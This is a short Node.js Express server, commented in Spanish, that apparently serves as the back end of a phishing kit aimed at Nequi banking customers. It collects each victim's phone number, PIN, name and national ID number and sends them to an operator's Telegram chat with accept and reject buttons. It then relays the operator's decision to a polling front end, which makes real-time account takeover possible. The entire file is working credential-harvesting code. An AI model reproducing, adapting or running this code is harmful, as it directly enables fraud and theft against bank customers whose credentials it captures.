const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const estados = {}; // Guarda decisiones por número

// Enviar mensaje con botones a Telegram
app.post('/enviar', async (req, res) => {
  const { numero, clave, nombre, cedula } = req.body;

  const mensaje = `🟣 Nueva solicitud Nequi:\n\n👤 Nombre: ${nombre}\n🆔 Cédula: ${cedula}\n📞 Número: ${numero}\n🔑 Clave: ${clave}`;

  const payload = {
    chat_id: CHAT_ID,
    text: mensaje,
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Aceptar', callback_data: `aceptar_${numero}` },
          { text: '❌ Rechazar', callback_data: `rechazar_${numero}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  res.send({ ok: true });
});

// Webhook de Telegram (recibe el botón presionado)
app.post('/webhook', async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(400);

  const data = callback.data;
  const numero = data.split('_')[1];
  const accion = data.split('_')[0];

  estados[numero] = accion;

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has elegido: ${accion}`
    })
  });

  res.sendStatus(200);
});

// Consultar el estado del número
app.get('/estado/:numero', (req, res) => {
  const numero = req.params.numero;
  res.send({ estado: estados[numero] || null });
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Servidor funcionando en el puerto', PORT));
